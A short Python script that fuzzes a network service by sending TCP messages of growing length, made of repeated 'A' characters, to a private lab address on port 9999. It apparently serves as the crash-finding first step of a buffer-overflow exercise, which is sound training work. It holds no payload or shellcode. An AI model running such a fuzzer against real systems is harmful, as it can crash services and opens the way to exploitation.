import socket

buffer = ["A"]

counter = 100

while len(buffer) <=30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print("Fuzzing the input with {0} bytes".format(len(string)))
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.1.49',9999)) 
	s.send(string+'\r\n')
	s.recv(1024)
	s.close()
